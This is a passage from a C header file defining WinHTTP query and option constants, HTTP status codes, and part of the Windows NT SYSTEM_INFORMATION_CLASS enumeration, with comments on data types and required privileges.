#define WINHTTP_QUERY_PROXY_CONNECTION             69
#define WINHTTP_QUERY_UNLESS_MODIFIED_SINCE        70
#define WINHTTP_QUERY_PROXY_SUPPORT                75
#define WINHTTP_QUERY_AUTHENTICATION_INFO          76
#define WINHTTP_QUERY_PASSPORT_URLS                77
#define WINHTTP_QUERY_PASSPORT_CONFIG              78
#define WINHTTP_QUERY_MAX                          78
#define WINHTTP_QUERY_CUSTOM                       65535
#define WINHTTP_QUERY_FLAG_REQUEST_HEADERS         0x80000000
#define WINHTTP_QUERY_FLAG_SYSTEMTIME              0x40000000
#define WINHTTP_QUERY_FLAG_NUMBER                  0x20000000
#define WINHTTP_QUERY_FLAG_NUMBER64                0x08000000
/* flags for WinHttp{Set/Query}Options */
#define WINHTTP_FIRST_OPTION                         WINHTTP_OPTION_CALLBACK
#define WINHTTP_OPTION_CALLBACK                       1
#define WINHTTP_OPTION_RESOLVE_TIMEOUT                2
#define WINHTTP_OPTION_CONNECT_TIMEOUT                3
#define WINHTTP_OPTION_CONNECT_RETRIES                4
#define WINHTTP_OPTION_SEND_TIMEOUT                   5
#define WINHTTP_OPTION_RECEIVE_TIMEOUT                6
#define WINHTTP_OPTION_RECEIVE_RESPONSE_TIMEOUT       7
#define WINHTTP_OPTION_HANDLE_TYPE                    9
#define WINHTTP_OPTION_READ_BUFFER_SIZE              12
#define WINHTTP_OPTION_WRITE_BUFFER_SIZE             13
#define WINHTTP_OPTION_PARENT_HANDLE                 21
#define WINHTTP_OPTION_EXTENDED_ERROR                24
#define WINHTTP_OPTION_SECURITY_FLAGS                31
#define WINHTTP_OPTION_SECURITY_CERTIFICATE_STRUCT   32
#define WINHTTP_OPTION_URL                           34
#define WINHTTP_OPTION_SECURITY_KEY_BITNESS          36
#define WINHTTP_OPTION_PROXY                         38
#define WINHTTP_OPTION_PROXY_RESULT_ENTRY            39
#define WINHTTP_OPTION_USER_AGENT                    41
#define WINHTTP_OPTION_CONTEXT_VALUE                 45
#define WINHTTP_OPTION_CLIENT_CERT_CONTEXT           47
#define WINHTTP_OPTION_REQUEST_PRIORITY              58
#define WINHTTP_OPTION_HTTP_VERSION                  59
#define WINHTTP_OPTION_DISABLE_FEATURE               63
#define WINHTTP_OPTION_CODEPAGE                      68
#define WINHTTP_OPTION_MAX_CONNS_PER_SERVER          73
#define WINHTTP_OPTION_MAX_CONNS_PER_1_0_SERVER      74
#define WINHTTP_OPTION_AUTOLOGON_POLICY              77
#define WINHTTP_OPTION_SERVER_CERT_CONTEXT           78
#define WINHTTP_OPTION_ENABLE_FEATURE                79
#define WINHTTP_OPTION_WORKER_THREAD_COUNT           80
#define WINHTTP_OPTION_PASSPORT_COBRANDING_TEXT      81
#define WINHTTP_OPTION_PASSPORT_COBRANDING_URL       82
#define WINHTTP_OPTION_CONFIGURE_PASSPORT_AUTH       83
#define WINHTTP_OPTION_SECURE_PROTOCOLS              84
#define WINHTTP_OPTION_ENABLETRACING                 85
#define WINHTTP_OPTION_PASSPORT_SIGN_OUT             86
#define WINHTTP_OPTION_PASSPORT_RETURN_URL           87
#define WINHTTP_OPTION_REDIRECT_POLICY               88
#define WINHTTP_OPTION_MAX_HTTP_AUTOMATIC_REDIRECTS  89
#define WINHTTP_OPTION_MAX_HTTP_STATUS_CONTINUE      90
#define WINHTTP_OPTION_MAX_RESPONSE_HEADER_SIZE      91
#define WINHTTP_OPTION_MAX_RESPONSE_DRAIN_SIZE       92
#define WINHTTP_OPTION_CONNECTION_INFO               93
#define WINHTTP_OPTION_CLIENT_CERT_ISSUER_LIST       94
#define WINHTTP_OPTION_SPN                           96
#define WINHTTP_OPTION_GLOBAL_PROXY_CREDS            97
#define WINHTTP_OPTION_GLOBAL_SERVER_CREDS           98
#define WINHTTP_OPTION_UNLOAD_NOTIFY_EVENT           99
#define WINHTTP_OPTION_REJECT_USERPWD_IN_URL         100
#define WINHTTP_OPTION_USE_GLOBAL_SERVER_CREDENTIALS 101
#define WINHTTP_OPTION_RECEIVE_PROXY_CONNECT_RESPONSE   103
#define WINHTTP_OPTION_IS_PROXY_CONNECT_RESPONSE        104
#define WINHTTP_OPTION_SERVER_SPN_USED                  106
#define WINHTTP_OPTION_PROXY_SPN_USED                   107
#define WINHTTP_OPTION_SERVER_CBT                       108
#define WINHTTP_OPTION_UNSAFE_HEADER_PARSING            110
#define WINHTTP_OPTION_ASSURED_NON_BLOCKING_CALLBACKS   111
#define WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET            114
#define WINHTTP_OPTION_WEB_SOCKET_CLOSE_TIMEOUT         115
#define WINHTTP_OPTION_WEB_SOCKET_KEEPALIVE_INTERVAL    116
#define WINHTTP_OPTION_DECOMPRESSION                    118
#define WINHTTP_OPTION_WEB_SOCKET_RECEIVE_BUFFER_SIZE   122
#define WINHTTP_OPTION_WEB_SOCKET_SEND_BUFFER_SIZE      123
#define WINHTTP_OPTION_TCP_PRIORITY_HINT                128
#define WINHTTP_OPTION_CONNECTION_FILTER                131
#define WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL             133
#define WINHTTP_OPTION_HTTP_PROTOCOL_USED               134
#define WINHTTP_OPTION_KDC_PROXY_SETTINGS               136
#define WINHTTP_OPTION_ENCODE_EXTRA                     138
#define WINHTTP_OPTION_DISABLE_STREAM_QUEUE             139
#define WINHTTP_OPTION_IPV6_FAST_FALLBACK               140
#define WINHTTP_OPTION_CONNECTION_STATS_V0              141
#define WINHTTP_OPTION_REQUEST_TIMES                    142
#define WINHTTP_OPTION_EXPIRE_CONNECTION                143
#define WINHTTP_OPTION_DISABLE_SECURE_PROTOCOL_FALLBACK 144
#define WINHTTP_OPTION_HTTP_PROTOCOL_REQUIRED           145
#define WINHTTP_OPTION_REQUEST_STATS                    146
#define WINHTTP_OPTION_SERVER_CERT_CHAIN_CONTEXT        147
#define WINHTTP_LAST_OPTION                          WINHTTP_OPTION_SERVER_CERT_CHAIN_CONTEXT
#define WINHTTP_OPTION_USERNAME                      0x1000
#define WINHTTP_OPTION_PASSWORD                      0x1001
#define WINHTTP_OPTION_PROXY_USERNAME                0x1002
#define WINHTTP_OPTION_PROXY_PASSWORD                0x1003

/* WinHttp status codes */
#define HTTP_STATUS_CONTINUE            100
#define HTTP_STATUS_SWITCH_PROTOCOLS    101
#define HTTP_STATUS_OK                  200
#define HTTP_STATUS_CREATED             201
#define HTTP_STATUS_ACCEPTED            202
#define HTTP_STATUS_PARTIAL             203
#define HTTP_STATUS_NO_CONTENT          204
#define HTTP_STATUS_RESET_CONTENT       205
#define HTTP_STATUS_PARTIAL_CONTENT     206
#define HTTP_STATUS_WEBDAV_MULTI_STATUS 207
#define HTTP_STATUS_AMBIGUOUS           300
#define HTTP_STATUS_MOVED               301
#define HTTP_STATUS_REDIRECT            302
#define HTTP_STATUS_REDIRECT_METHOD     303
#define HTTP_STATUS_NOT_MODIFIED        304
#define HTTP_STATUS_USE_PROXY           305
#define HTTP_STATUS_REDIRECT_KEEP_VERB  307
#define HTTP_STATUS_PERMANENT_REDIRECT  308
#define HTTP_STATUS_BAD_REQUEST         400
#define HTTP_STATUS_DENIED              401
#define HTTP_STATUS_PAYMENT_REQ         402
#define HTTP_STATUS_FORBIDDEN           403
#define HTTP_STATUS_NOT_FOUND           404
#define HTTP_STATUS_BAD_METHOD          405
#define HTTP_STATUS_NONE_ACCEPTABLE     406
#define HTTP_STATUS_PROXY_AUTH_REQ      407
#define HTTP_STATUS_REQUEST_TIMEOUT     408
#define HTTP_STATUS_CONFLICT            409
#define HTTP_STATUS_GONE                410
#define HTTP_STATUS_LENGTH_REQUIRED     411
#define HTTP_STATUS_PRECOND_FAILED      412
#define HTTP_STATUS_REQUEST_TOO_LARGE   413
#define HTTP_STATUS_URI_TOO_LONG        414
#define HTTP_STATUS_UNSUPPORTED_MEDIA   415
#define HTTP_STATUS_RETRY_WITH          449
#define HTTP_STATUS_SERVER_ERROR        500
#define HTTP_STATUS_NOT_SUPPORTED       501
#define HTTP_STATUS_BAD_GATEWAY         502
#define HTTP_STATUS_SERVICE_UNAVAIL     503
#define HTTP_STATUS_GATEWAY_TIMEOUT     504
#define HTTP_STATUS_VERSION_NOT_SUP     505
#define HTTP_STATUS_FIRST               HTTP_STATUS_CONTINUE
#define HTTP_STATUS_LAST                HTTP_STATUS_VERSION_NOT_SUP

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,                                 // q: SYSTEM_BASIC_INFORMATION
    SystemProcessorInformation,                             // q: SYSTEM_PROCESSOR_INFORMATION
    SystemPerformanceInformation,                           // q: SYSTEM_PERFORMANCE_INFORMATION
    SystemTimeOfDayInformation,                             // q: SYSTEM_TIMEOFDAY_INFORMATION
    SystemPathInformation,                                  // q: not implemented
    SystemProcessInformation,                               // q: SYSTEM_PROCESS_INFORMATION
    SystemCallCountInformation,                             // q: SYSTEM_CALL_COUNT_INFORMATION
    SystemDeviceInformation,                                // q: SYSTEM_DEVICE_INFORMATION
    SystemProcessorPerformanceInformation,                  // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION (EX in: USHORT ProcessorGroup)
    SystemFlagsInformation,                                 // qs: SYSTEM_FLAGS_INFORMATION
    SystemCallTimeInformation,                              // q: SYSTEM_CALL_TIME_INFORMATION // not implemented // 10
    SystemModuleInformation,                                // q: RTL_PROCESS_MODULES
    SystemLocksInformation,                                 // q: RTL_PROCESS_LOCKS
    SystemStackTraceInformation,                            // q: RTL_PROCESS_BACKTRACES
    SystemPagedPoolInformation,                             // q: not implemented
    SystemNonPagedPoolInformation,                          // q: not implemented
    SystemHandleInformation,                                // q: SYSTEM_HANDLE_INFORMATION
    SystemObjectInformation,                                // q: SYSTEM_OBJECTTYPE_INFORMATION mixed with SYSTEM_OBJECT_INFORMATION
    SystemPageFileInformation,                              // q: SYSTEM_PAGEFILE_INFORMATION
    SystemVdmInstemulInformation,                           // q: SYSTEM_VDM_INSTEMUL_INFO
    SystemVdmBopInformation,                                // q: not implemented // 20
    SystemFileCacheInformation,                             // qs: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemCache)
    SystemPoolTagInformation,                               // q: SYSTEM_POOLTAG_INFORMATION
    SystemInterruptInformation,                             // q: SYSTEM_INTERRUPT_INFORMATION (EX in: USHORT ProcessorGroup)
    SystemDpcBehaviorInformation,                           // qs: SYSTEM_DPC_BEHAVIOR_INFORMATION; s: SYSTEM_DPC_BEHAVIOR_INFORMATION (requires SeLoadDriverPrivilege)
    SystemFullMemoryInformation,                            // q: SYSTEM_MEMORY_USAGE_INFORMATION // not implemented
    SystemLoadGdiDriverInformation,                         // s: (kernel-mode only)
    SystemUnloadGdiDriverInformation,                       // s: (kernel-mode only)
    SystemTimeAdjustmentInformation,                        // qs: SYSTEM_QUERY_TIME_ADJUST_INFORMATION; s: SYSTEM_SET_TIME_ADJUST_INFORMATION (requires SeSystemtimePrivilege)
    SystemSummaryMemoryInformation,                         // q: SYSTEM_MEMORY_USAGE_INFORMATION // not implemented
    SystemMirrorMemoryInformation,                          // qs: (requires license value "Kernel-MemoryMirroringSupported") (requires SeShutdownPrivilege) // 30
    SystemPerformanceTraceInformation,                      // qs: (type depends on EVENT_TRACE_INFORMATION_CLASS)
    SystemObsolete0,                                        // q: not implemented
    SystemExceptionInformation,                             // q: SYSTEM_EXCEPTION_INFORMATION
    SystemCrashDumpStateInformation,                        // s: SYSTEM_CRASH_DUMP_STATE_INFORMATION (requires SeDebugPrivilege)
    SystemKernelDebuggerInformation,                        // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION
    SystemContextSwitchInformation,                         // q: SYSTEM_CONTEXT_SWITCH_INFORMATION
    SystemRegistryQuotaInformation,                         // qs: SYSTEM_REGISTRY_QUOTA_INFORMATION; s (requires SeIncreaseQuotaPrivilege)
    SystemExtendServiceTableInformation,                    // s: (requires SeLoadDriverPrivilege) // loads win32k only
    SystemPrioritySeparation,                               // s: (requires SeTcbPrivilege)
    SystemVerifierAddDriverInformation,                     // s: UNICODE_STRING (requires SeDebugPrivilege) // 40
    SystemVerifierRemoveDriverInformation,                  // s: UNICODE_STRING (requires SeDebugPrivilege)
    SystemProcessorIdleInformation,                         // q: SYSTEM_PROCESSOR_IDLE_INFORMATION (EX in: USHORT ProcessorGroup)
    SystemLegacyDriverInformation,                          // q: SYSTEM_LEGACY_DRIVER_INFORMATION
    SystemCurrentTimeZoneInformation,                       // qs: RTL_TIME_ZONE_INFORMATION
    SystemLookasideInformation,                             // q: SYSTEM_LOOKASIDE_INFORMATION
    SystemTimeSlipNotification,                             // s: HANDLE (NtCreateEvent) (requires SeSystemtimePrivilege)
    SystemSessionCreate,                                    // q: not implemented
    SystemSessionDetach,                                    // q: not implemented
    SystemSessionInformation,                               // q: not implemented (SYSTEM_SESSION_INFORMATION)
    SystemRangeStartInformation,                            // q: SYSTEM_RANGE_START_INFORMATION // 50
    SystemVerifierInformation,                              // qs: SYSTEM_VERIFIER_INFORMATION; s (requires SeDebugPrivilege)
    SystemVerifierThunkExtend,                              // qs: (kernel-mode only)
    SystemSessionProcessInformation,                        // q: SYSTEM_SESSION_PROCESS_INFORMATION
    SystemLoadGdiDriverInSystemSpace,                       // qs: SYSTEM_GDI_DRIVER_INFORMATION (kernel-mode only) (same as SystemLoadGdiDriverInformation)
    SystemNumaProcessorMap,                                 // q: SYSTEM_NUMA_INFORMATION
    SystemPrefetcherInformation,                            // qs: PREFETCHER_INFORMATION // PfSnQueryPrefetcherInformation
    SystemExtendedProcessInformation,                       // q: SYSTEM_EXTENDED_PROCESS_INFORMATION
    SystemRecommendedSharedDataAlignment,                   // q: ULONG // KeGetRecommendedSharedDataAlignment
    SystemComPlusPackage,                                   // qs: ULONG
    SystemNumaAvailableMemory,                              // q: SYSTEM_NUMA_INFORMATION // 60
    SystemProcessorPowerInformation,                        // q: SYSTEM_PROCESSOR_POWER_INFORMATION (EX in: USHORT ProcessorGroup)
    SystemEmulationBasicInformation,                        // q: SYSTEM_BASIC_INFORMATION
    SystemEmulationProcessorInformation,                    // q: SYSTEM_PROCESSOR_INFORMATION
    SystemExtendedHandleInformation,                        // q: SYSTEM_HANDLE_INFORMATION_EX
    SystemLostDelayedWriteInformation,                      // q: ULONG
    SystemBigPoolInformation,                               // q: SYSTEM_BIGPOOL_INFORMATION
    SystemSessionPoolTagInformation,                        // q: SYSTEM_SESSION_POOLTAG_INFORMATION
    SystemSessionMappedViewInformation,                     // q: SYSTEM_SESSION_MAPPED_VIEW_INFORMATION
    SystemHotpatchInformation,                              // qs: SYSTEM_HOTPATCH_CODE_INFORMATION
    SystemObjectSecurityMode,                               // q: ULONG // 70
    SystemWatchdogTimerHandler,                             // s: SYSTEM_WATCHDOG_HANDLER_INFORMATION // (kernel-mode only)
    SystemWatchdogTimerInformation,                         // qs: out: SYSTEM_WATCHDOG_TIMER_INFORMATION (EX in: ULONG WATCHDOG_INFORMATION_CLASS) // NtQuerySystemInformationEx
    SystemLogicalProcessorInformation,                      // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx
    SystemWow64SharedInformationObsolete,                   // q: not implemented
    SystemRegisterFirmwareTableInformationHandler,          // s: SYSTEM_FIRMWARE_TABLE_HANDLER // (kernel-mode only)
    SystemFirmwareTableInformation,                         // q: SYSTEM_FIRMWARE_TABLE_INFORMATION
    SystemModuleInformationEx,                              // q: RTL_PROCESS_MODULE_INFORMATION_EX // since VISTA
    SystemVerifierTriageInformation,                        // q: not implemented
    SystemSuperfetchInformation,                            // qs: SUPERFETCH_INFORMATION // PfQuerySuperfetchInformation
    SystemMemoryListInformation,                            // q: SYSTEM_MEMORY_LIST_INFORMATION; s: SYSTEM_MEMORY_LIST_COMMAND (requires SeProfileSingleProcessPrivilege) // 80
    SystemFileCacheInformationEx,                           // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (same as SystemFileCacheInformation)
    SystemThreadPriorityClientIdInformation,                // s: SYSTEM_THREAD_CID_PRIORITY_INFORMATION (requires SeIncreaseBasePriorityPrivilege) // NtQuerySystemInformationEx
    SystemProcessorIdleCycleTimeInformation,                // q: SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION[] (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx
    SystemVerifierCancellationInformation,                  // q: SYSTEM_VERIFIER_CANCELLATION_INFORMATION // name:wow64:whNT32QuerySystemVerifierCancellationInformation
    SystemProcessorPowerInformationEx,                      // q: not implemented
    SystemRefTraceInformation,                              // qs: SYSTEM_REF_TRACE_INFORMATION // ObQueryRefTraceInformation
    SystemSpecialPoolInformation,                           // qs: SYSTEM_SPECIAL_POOL_INFORMATION (requires SeDebugPrivilege) // MmSpecialPoolTag, then MmSpecialPoolCatchOverruns != 0
    SystemProcessIdInformation,                             // q: SYSTEM_PROCESS_ID_INFORMATION
    SystemErrorPortInformation,                             // s: (requires SeTcbPrivilege)
    SystemBootEnvironmentInformation,                       // q: SYSTEM_BOOT_ENVIRONMENT_INFORMATION // 90
    SystemHypervisorInformation,                            // q: SYSTEM_HYPERVISOR_QUERY_INFORMATION
    SystemVerifierInformationEx,                            // qs: SYSTEM_VERIFIER_INFORMATION_EX
    SystemTimeZoneInformation,                              // qs: RTL_TIME_ZONE_INFORMATION (requires SeTimeZonePrivilege)
    SystemImageFileExecutionOptionsInformation,             // s: SYSTEM_IMAGE_FILE_EXECUTION_OPTIONS_INFORMATION (requires SeTcbPrivilege)
    SystemCoverageInformation,                              // q: COVERAGE_MODULES s: COVERAGE_MODULE_REQUEST // ExpCovQueryInformation (requires SeDebugPrivilege)
    SystemPrefetchPatchInformation,                         // q: SYSTEM_PREFETCH_PATCH_INFORMATION
    SystemVerifierFaultsInformation,                        // s: SYSTEM_VERIFIER_FAULTS_INFORMATION (requires SeDebugPrivilege)
    SystemSystemPartitionInformation,                       // q: SYSTEM_SYSTEM_PARTITION_INFORMATION
    SystemSystemDiskInformation,                            // q: SYSTEM_SYSTEM_DISK_INFORMATION
    SystemProcessorPerformanceDistribution,                 // q: SYSTEM_PROCESSOR_PERFORMANCE_DISTRIBUTION (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx // 100
    SystemNumaProximityNodeInformation,                     // qs: SYSTEM_NUMA_PROXIMITY_MAP
    SystemDynamicTimeZoneInformation,                       // qs: RTL_DYNAMIC_TIME_ZONE_INFORMATION (requires SeTimeZonePrivilege)
    SystemCodeIntegrityInformation,                         // q: SYSTEM_CODEINTEGRITY_INFORMATION // SeCodeIntegrityQueryInformation
    SystemProcessorMicrocodeUpdateInformation,              // s: SYSTEM_PROCESSOR_MICROCODE_UPDATE_INFORMATION
    SystemProcessorBrandString,                             // q: CHAR[] // HaliQuerySystemInformation -> HalpGetProcessorBrandString, info class 23
    SystemVirtualAddressInformation,                        // q: SYSTEM_VA_LIST_INFORMATION[]; s: SYSTEM_VA_LIST_INFORMATION[] (requires SeIncreaseQuotaPrivilege) // MmQuerySystemVaInformation
    SystemLogicalProcessorAndGroupInformation,              // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX (EX in: LOGICAL_PROCESSOR_RELATIONSHIP RelationshipType) // since WIN7 // NtQuerySystemInformationEx // KeQueryLogicalProcessorRelationship
    SystemProcessorCycleTimeInformation,                    // q: SYSTEM_PROCESSOR_CYCLE_TIME_INFORMATION[] (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx
    SystemStoreInformation,                                 // qs: SYSTEM_STORE_INFORMATION (requires SeProfileSingleProcessPrivilege) // SmQueryStoreInformation
    SystemRegistryAppendString,                             // s: SYSTEM_REGISTRY_APPEND_STRING_PARAMETERS // 110
    SystemAitSamplingValue,                                 // s: ULONG (requires SeProfileSingleProcessPrivilege)
    SystemVhdBootInformation,                               // q: SYSTEM_VHD_BOOT_INFORMATION
    SystemCpuQuotaInformation,                              // qs: PS_CPU_QUOTA_QUERY_INFORMATION
    SystemNativeBasicInformation,                           // q: SYSTEM_BASIC_INFORMATION
    SystemErrorPortTimeouts,                                // q: SYSTEM_ERROR_PORT_TIMEOUTS
    SystemLowPriorityIoInformation,                         // q: SYSTEM_LOW_PRIORITY_IO_INFORMATION
    SystemTpmBootEntropyInformation,                        // q: BOOT_ENTROPY_NT_RESULT // ExQueryBootEntropyInformation
    SystemVerifierCountersInformation,                      // q: SYSTEM_VERIFIER_COUNTERS_INFORMATION
    SystemPagedPoolInformationEx,                           // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypePagedPool)
    SystemSystemPtesInformationEx,                          // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemPtes) // 120
    SystemNodeDistanceInformation,                          // q: USHORT[4*NumaNodes] // (EX in: USHORT NodeNumber) // NtQuerySystemInformationEx
    SystemAcpiAuditInformation,                             // q: SYSTEM_ACPI_AUDIT_INFORMATION // HaliQuerySystemInformation -> HalpAuditQueryResults, info class 26
    SystemBasicPerformanceInformation,                      // q: SYSTEM_BASIC_PERFORMANCE_INFORMATION // name:wow64:whNtQuerySystemInformation_SystemBasicPerformanceInformation
    SystemQueryPerformanceCounterInformation,               // q: SYSTEM_QUERY_PERFORMANCE_COUNTER_INFORMATION // since WIN7 SP1
    SystemSessionBigPoolInformation,                        // q: SYSTEM_SESSION_POOLTAG_INFORMATION // since WIN8
    SystemBootGraphicsInformation,                          // qs: SYSTEM_BOOT_GRAPHICS_INFORMATION (kernel-mode only)
    SystemScrubPhysicalMemoryInformation,                   // qs: MEMORY_SCRUB_INFORMATION
    SystemBadPageInformation,                               // q: SYSTEM_BAD_PAGE_INFORMATION
    SystemProcessorProfileControlArea,                      // qs: SYSTEM_PROCESSOR_PROFILE_CONTROL_AREA
    SystemCombinePhysicalMemoryInformation,                 // s: MEMORY_COMBINE_INFORMATION, MEMORY_COMBINE_INFORMATION_EX, MEMORY_COMBINE_INFORMATION_EX2 // 130
    SystemEntropyInterruptTimingInformation,                // qs: SYSTEM_ENTROPY_TIMING_INFORMATION
    SystemConsoleInformation,                               // qs: SYSTEM_CONSOLE_INFORMATION
    SystemPlatformBinaryInformation,                        // q: SYSTEM_PLATFORM_BINARY_INFORMATION (requires SeTcbPrivilege)
    SystemPolicyInformation,                                // q: SYSTEM_POLICY_INFORMATION (Warbird/Encrypt/Decrypt/Execute)
    SystemHypervisorProcessorCountInformation,              // q: SYSTEM_HYPERVISOR_PROCESSOR_COUNT_INFORMATION
    SystemDeviceDataInformation,                            // q: SYSTEM_DEVICE_DATA_INFORMATION
    SystemDeviceDataEnumerationInformation,                 // q: SYSTEM_DEVICE_DATA_INFORMATION
    SystemMemoryTopologyInformation,                        // q: SYSTEM_MEMORY_TOPOLOGY_INFORMATION
    SystemMemoryChannelInformation,                         // q: SYSTEM_MEMORY_CHANNEL_INFORMATION
    SystemBootLogoInformation,                              // q: SYSTEM_BOOT_LOGO_INFORMATION // 140
    SystemProcessorPerformanceInformationEx,                // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX // (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx // since WINBLUE
    SystemCriticalProcessErrorLogInformation,               // q: CRITICAL_PROCESS_EXCEPTION_DATA
    SystemSecureBootPolicyInformation,                      // q: SYSTEM_SECUREBOOT_POLICY_INFORMATION
    SystemPageFileInformationEx,                            // q: SYSTEM_PAGEFILE_INFORMATION_EX
    SystemSecureBootInformation,                            // q: SYSTEM_SECUREBOOT_INFORMATION
    SystemEntropyInterruptTimingRawInformation,             // qs: SYSTEM_ENTROPY_TIMING_INFORMATION
    SystemPortableWorkspaceEfiLauncherInformation,          // q: SYSTEM_PORTABLE_WORKSPACE_EFI_LAUNCHER_INFORMATION
    SystemFullProcessInformation,                           // q: SYSTEM_EXTENDED_PROCESS_INFORMATION with SYSTEM_PROCESS_INFORMATION_EXTENSION (requires admin)
    SystemKernelDebuggerInformationEx,                      // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX
    SystemBootMetadataInformation,                          // q: (requires SeTcbPrivilege) // 150
    SystemSoftRebootInformation,                            // q: ULONG
    SystemElamCertificateInformation,                       // s: SYSTEM_ELAM_CERTIFICATE_INFORMATION
    SystemOfflineDumpConfigInformation,                     // q: OFFLINE_CRASHDUMP_CONFIGURATION_TABLE_V2
    SystemProcessorFeaturesInformation,                     // q: SYSTEM_PROCESSOR_FEATURES_INFORMATION
    SystemRegistryReconciliationInformation,                // s: NULL (requires admin) (flushes registry hives)
    SystemEdidInformation,                                  // q: SYSTEM_EDID_INFORMATION
    SystemManufacturingInformation,                         // q: SYSTEM_MANUFACTURING_INFORMATION // since THRESHOLD
    SystemEnergyEstimationConfigInformation,                // q: SYSTEM_ENERGY_ESTIMATION_CONFIG_INFORMATION
    SystemHypervisorDetailInformation,                      // q: SYSTEM_HYPERVISOR_DETAIL_INFORMATION
    SystemProcessorCycleStatsInformation,                   // q: SYSTEM_PROCESSOR_CYCLE_STATS_INFORMATION (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx // 160
    SystemVmGenerationCountInformation,
    SystemTrustedPlatformModuleInformation,                 // q: SYSTEM_TPM_INFORMATION
    SystemKernelDebuggerFlags,                              // q: SYSTEM_KERNEL_DEBUGGER_FLAGS
    SystemCodeIntegrityPolicyInformation,                   // qs: SYSTEM_CODEINTEGRITYPOLICY_INFORMATION
    SystemIsolatedUserModeInformation,                      // q: SYSTEM_ISOLATED_USER_MODE_INFORMATION
    SystemHardwareSecurityTestInterfaceResultsInformation,
    SystemSingleModuleInformation,                          // q: SYSTEM_SINGLE_MODULE_INFORMATION
    SystemAllowedCpuSetsInformation,                        // s: SYSTEM_WORKLOAD_ALLOWED_CPU_SET_INFORMATION
    SystemVsmProtectionInformation,                         // q: SYSTEM_VSM_PROTECTION_INFORMATION (previously SystemDmaProtectionInformation)
    SystemInterruptCpuSetsInformation,                      // q: SYSTEM_INTERRUPT_CPU_SET_INFORMATION // 170
    SystemSecureBootPolicyFullInformation,                  // q: SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION
    SystemCodeIntegrityPolicyFullInformation,
    SystemAffinitizedInterruptProcessorInformation,         // q: KAFFINITY_EX // (requires SeIncreaseBasePriorityPrivilege)
    SystemRootSiloInformation,                              // q: SYSTEM_ROOT_SILO_INFORMATION
    SystemCpuSetInformation,                                // q: SYSTEM_CPU_SET_INFORMATION // since THRESHOLD2
    SystemCpuSetTagInformation,                             // q: SYSTEM_CPU_SET_TAG_INFORMATION
    SystemWin32WerStartCallout,
    SystemSecureKernelProfileInformation,                   // q: SYSTEM_SECURE_KERNEL_HYPERGUARD_PROFILE_INFORMATION
    SystemCodeIntegrityPlatformManifestInformation,         // q: SYSTEM_SECUREBOOT_PLATFORM_MANIFEST_INFORMATION // NtQuerySystemInformationEx // since REDSTONE
    SystemInterruptSteeringInformation,                     // q: in: SYSTEM_INTERRUPT_STEERING_INFORMATION_INPUT, out: SYSTEM_INTERRUPT_STEERING_INFORMATION_OUTPUT // NtQuerySystemInformationEx
    SystemSupportedProcessorArchitectures,                  // p: in opt: HANDLE, out: SYSTEM_SUPPORTED_PROCESSOR_ARCHITECTURES_INFORMATION[] // NtQuerySystemInformationEx // 180
    SystemMemoryUsageInformation,                           // q: SYSTEM_MEMORY_USAGE_INFORMATION
    SystemCodeIntegrityCertificateInformation,              // q: SYSTEM_CODEINTEGRITY_CERTIFICATE_INFORMATION
    SystemPhysicalMemoryInformation,                        // q: SYSTEM_PHYSICAL_MEMORY_INFORMATION // since REDSTONE2
    SystemControlFlowTransition,                            // qs: (Warbird/Encrypt/Decrypt/Execute)
    SystemKernelDebuggingAllowed,                           // s: ULONG
    SystemActivityModerationExeState,                       // s: SYSTEM_ACTIVITY_MODERATION_EXE_STATE
    SystemActivityModerationUserSettings,                   // q: SYSTEM_ACTIVITY_MODERATION_USER_SETTINGS
    SystemCodeIntegrityPoliciesFullInformation,             // qs: NtQuerySystemInformationEx
    SystemCodeIntegrityUnlockInformation,                   // q: SYSTEM_CODEINTEGRITY_UNLOCK_INFORMATION // 190
    SystemIntegrityQuotaInformation,
    SystemFlushInformation,                                 // q: SYSTEM_FLUSH_INFORMATION
    SystemProcessorIdleMaskInformation,                     // q: ULONG_PTR[ActiveGroupCount] // since REDSTONE3
    SystemSecureDumpEncryptionInformation,                  // qs: NtQuerySystemInformationEx
    SystemWriteConstraintInformation,                       // q: SYSTEM_WRITE_CONSTRAINT_INFORMATION
    SystemKernelVaShadowInformation,                        // q: SYSTEM_KERNEL_VA_SHADOW_INFORMATION
    SystemHypervisorSharedPageInformation,                  // q: SYSTEM_HYPERVISOR_SHARED_PAGE_INFORMATION // since REDSTONE4
    SystemFirmwareBootPerformanceInformation,
    SystemCodeIntegrityVerificationInformation,             // q: SYSTEM_CODEINTEGRITYVERIFICATION_INFORMATION
    SystemFirmwarePartitionInformation,                     // q: SYSTEM_FIRMWARE_PARTITION_INFORMATION // 200
    SystemSpeculationControlInformation,                    // q: SYSTEM_SPECULATION_CONTROL_INFORMATION // (CVE-2017-5715) REDSTONE3 and above.
    SystemDmaGuardPolicyInformation,                        // q: SYSTEM_DMA_GUARD_POLICY_INFORMATION
    SystemEnclaveLaunchControlInformation,                  // q: SYSTEM_ENCLAVE_LAUNCH_CONTROL_INFORMATION
    SystemWorkloadAllowedCpuSetsInformation,                // q: SYSTEM_WORKLOAD_ALLOWED_CPU_SET_INFORMATION // since REDSTONE5
    SystemCodeIntegrityUnlockModeInformation,               // q: SYSTEM_CODEINTEGRITY_UNLOCK_INFORMATION
